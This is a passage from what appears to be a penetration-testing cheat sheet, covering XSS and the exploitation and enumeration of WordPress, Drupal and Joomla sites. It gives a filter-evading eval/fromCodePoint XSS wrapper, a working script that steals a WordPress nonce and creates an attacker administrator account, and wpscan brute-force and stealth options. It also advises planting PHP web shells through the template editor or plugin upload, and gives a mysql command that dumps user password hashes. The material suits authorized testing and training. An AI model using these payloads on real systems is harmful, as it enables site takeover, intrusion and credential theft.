page\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Perform Cross-Site Request Forgery (CSRF) using victim's/Admin's session (may need to steal token/nonce). Maybe create a new admin user or change admin password?\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eWhen injecting XSS javascript payload, you may may want to ensure no characters get filtered. An easy way to ensure that is to encode the payload as Unicode code points.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"// Use the following code in your browser's console to encode the payload as Unicode code points.\nfunction encode_javascript(minified_js) {\n\treturn [...minified_js].map(function (c) { return c.codePointAt(0); }).join(\u0026quot;,\u0026quot;)\n}\nlet encoded = encode_javascript(\u0026quot;insert_minified_javascript\u0026quot;) // replace with your payload\nconsole.log(encoded)\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e// Use the following code in your browser's console to encode the payload as Unicode code points.\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eencode_javascript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eminified_js\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\n\t\u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e...\u003cspan class=\"pl-s1\"\u003eminified_js\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003emap\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ec\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ec\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003ecodePointAt\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003ejoin\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\",\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003elet\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eencoded\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eencode_javascript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"insert_minified_javascript\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e// replace with your payload\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003econsole\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003elog\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eencoded\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOnce the payload is encoded, insert the resulting array of integers into the following injected XSS script tag:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;!-- replace digits with output from previous encoder --\u0026gt;\n\u0026lt;script\u0026gt;eval(String.fromCodePoint(97,108,101,114,116,40,39,128526,39,41))\u0026lt;/script\u0026gt;\n\u0026lt;!-- example is code for \u0026quot;alert('')\u0026quot; --\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!-- replace digits with output from previous encoder --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eeval\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-v\"\u003eString\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003efromCodePoint\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e97\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e108\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e101\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e114\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e116\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e40\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e39\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e128526\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e39\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e41\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u0026lt;!-- example is code for \"alert('')\" --\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHere is an example script payload that creates an admin user on a vulnerable WordPress site by exploiting the vulnerable User-Agent header:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"// Collect WordPress nonce from admin user\nvar ajaxRequest = new XMLHttpRequest();\nvar requestURL = \u0026quot;/wp-admin/user-new.php\u0026quot;;\nvar nonceRegex = /ser\u0026quot; value=\u0026quot;([^\u0026quot;]*?)\u0026quot;/g;\najaxRequest.open(\u0026quot;GET\u0026quot;, requestURL, false);\najaxRequest.send();\nvar nonceMatch = nonceRegex.exec(ajaxRequest.responseText);\nvar nonce = nonceMatch[1];\n\n// Create new admin account\nvar params = \u0026quot;action=createuser\u0026amp;_wpnonce_create-user=\u0026quot;+nonce+\u0026quot;\u0026amp;user_login=derp\u0026amp;email=derp@derp.com\u0026amp;pass1=herpderp\u0026amp;pass2=herpderp\u0026amp;role=administrator\u0026quot;;\najaxRequest = new XMLHttpRequest();\najaxRequest.open(\u0026quot;POST\u0026quot;, requestURL, true);\najaxRequest.setRequestHeader(\u0026quot;Content-Type\u0026quot;, \u0026quot;application/x-www-form-urlencoded\u0026quot;);\najaxRequest.send(params);\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e// Collect WordPress nonce from admin user\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003evar\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eajaxRequest\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-k\"\u003enew\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003evar\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erequestURL\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"/wp-admin/user-new.php\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003evar\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enonceRegex\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-pds\"\u003e\u003cspan class=\"pl-c1\"\u003e/\u003c/span\u003eser\" value=\"([^\"]*?)\"\u003cspan class=\"pl-c1\"\u003e/\u003c/span\u003eg\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003eajaxRequest\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eopen\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"GET\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erequestURL\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003efalse\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003eajaxRequest\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003esend\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003evar\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enonceMatch\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enonceRegex\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eexec\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eajaxRequest\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eresponseText\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003evar\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enonce\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enonceMatch\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e// Create new admin account\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003evar\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eparams\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"action=createuser\u0026amp;_wpnonce_create-user=\"\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003enonce\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"\u0026amp;user_login=derp\u0026amp;email=derp@derp.com\u0026amp;pass1=herpderp\u0026amp;pass2=herpderp\u0026amp;role=administrator\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003eajaxRequest\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-k\"\u003enew\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003eajaxRequest\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eopen\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"POST\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erequestURL\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etrue\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003eajaxRequest\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003esetRequestHeader\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"Content-Type\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"application/x-www-form-urlencoded\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003eajaxRequest\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003esend\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eparams\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.8 WordPress\u003c/h3\u003e\u003ca id=\"user-content-268-wordpress\" class=\"anchor\" aria-label=\"Permalink: 2.6.8 WordPress\" href=\"#268-wordpress\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"wpscan --update -o wp-scan.txt --url http://$VICTIM_IP/\n\n# --enumerate options:\n# p = Popular plugins\n# vp = Vulnerable plugins\n# ap = All plugins (takes a while)\n# t = Popular themes\n# vt = Vulnerable themes\n# at = All themes (takes a while)\n# cb = Config backups\n# tt = Timthumbs\n# dbe = Db exports\n# u = usernames w/ ids 1-10\n# m = media IDs 1-10\n# NOTE: Value if no argument supplied: --enumerate vp,vt,tt,cb,dbe,u,m\n\n# other useful flags:\n# --login-uri URI\n#     The URI of the login page if different from /wp-login.php\n# --random-user-agent, --rua\n#     Be a bit more stealthy\n# --update\n#     update the WPScan database before scanning\n\n# username / password bruteforce possible\n# -U, --usernames LIST\n#     LIST of usernames and/or files w/ usernames to try. e.g. admin,users.txt\n#     Will auto-enum users if -U not supplied\n# -P, --passwords FILE-PATH\n#     path to password file for brute force\n\n# aggressive scan:\nwpscan --update \\\n       --random-user-agent \\\n       --enumerate ap,at,cb,dbe,u \\\n       --detection-mode aggressive \\\n       --plugins-detection aggressive \\\n       --plugins-version-detection aggressive \\\n       --url http://$VICTIM_IP/\n\n# scan with cmsmap (https://github.com/Dionach/CMSmap):\ncmsmap -o cmsmap.txt -d http://$VICTIM_IP\"\u003e\u003cpre\u003ewpscan --update -o wp-scan.txt --url http://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e/\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e --enumerate options:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e p = Popular plugins\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e vp = Vulnerable plugins\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ap = All plugins (takes a while)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e t = Popular themes\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e vt = Vulnerable themes\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e at = All themes (takes a while)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e cb = Config backups\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e tt = Timthumbs\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dbe = Db exports\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e u = usernames w/ ids 1-10\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e m = media IDs 1-10\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e NOTE: Value if no argument supplied: --enumerate vp,vt,tt,cb,dbe,u,m\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e other useful flags:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e --login-uri URI\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e     The URI of the login page if different from /wp-login.php\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e --random-user-agent, --rua\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e     Be a bit more stealthy\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e --update\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e     update the WPScan database before scanning\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e username / password bruteforce possible\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -U, --usernames LIST\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e     LIST of usernames and/or files w/ usernames to try. e.g. admin,users.txt\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e     Will auto-enum users if -U not supplied\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -P, --passwords FILE-PATH\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e     path to password file for brute force\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e aggressive scan:\u003c/span\u003e\nwpscan --update \\\n       --random-user-agent \\\n       --enumerate ap,at,cb,dbe,u \\\n       --detection-mode aggressive \\\n       --plugins-detection aggressive \\\n       --plugins-version-detection aggressive \\\n       --url http://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e/\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e scan with cmsmap (https://github.com/Dionach/CMSmap):\u003c/span\u003e\ncmsmap -o cmsmap.txt -d http://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlso try logging into the Wordpress admin page (\u003ccode\u003e/wp-admin\u003c/code\u003e).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eIf you can log in, you can update the page template to get code execution. Appearance  Editor  404 Template (at the right), add a PHP shell.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eAfter admin portal login, also try plugin upload to add a web shell/known vulnerable plugin. Remember to activate plugin after install.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/p0dalirius/Wordpress-webshell-plugin\"\u003eWordPress Plugin Webshell\u003c/a\u003e - accessible via \u003ccode\u003e/wp-content/plugins/wp_webshell/wp_webshell.php?action=exec\u0026amp;cmd=id\u003c/code\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eMaybe upload Media file that has PHP script?\u003c/p\u003e\n\u003cp dir=\"auto\"\u003ePost exploit: The \u003ccode\u003ewp-config.php\u003c/code\u003e file contains information required by WordPress to connect to the database (credentials).\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Extract usernames and passwords:\nmysql -u USERNAME --password=PASSWORD -h localhost -e \u0026quot;use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Extract usernames and passwords:\u003c/span\u003e\nmysql -u USERNAME --password=PASSWORD -h localhost -e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003euse wordpress;select concat_ws(':', user_login, user_pass) from wp_users;\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCheck \u003ca href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress\" rel=\"nofollow\"\u003eHackTricks\u003c/a\u003e for more.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.9 Drupal\u003c/h3\u003e\u003ca id=\"user-content-269-drupal\" class=\"anchor\" aria-label=\"Permalink: 2.6.9 Drupal\" href=\"#269-drupal\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"droopescan scan drupal http://$VICTIM_IP -t 32 # if drupal found\"\u003e\u003cpre\u003edroopescan scan drupal http://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e -t 32 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if drupal found\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.10 Joomla\u003c/h3\u003e\u003ca id=\"user-content-2610-joomla\" class=\"anchor\" aria-label=\"Permalink: 2.6.10 Joomla\" href=\"#2610-joomla\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"joomscan --ec -u $VICTIM_IP # if joomla found\"\u003e\u003cpre\u003ejoomscan --ec -u \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if joomla found\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.7 Kerberos - 88,749\u003c/h2\u003e\u003ca id=\"user-content-27-kerberos---88749\" class=\"anchor\" aria-label=\"Permalink: 2.7 Kerberos - 88,749\" href=\"#27-kerberos---88749\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 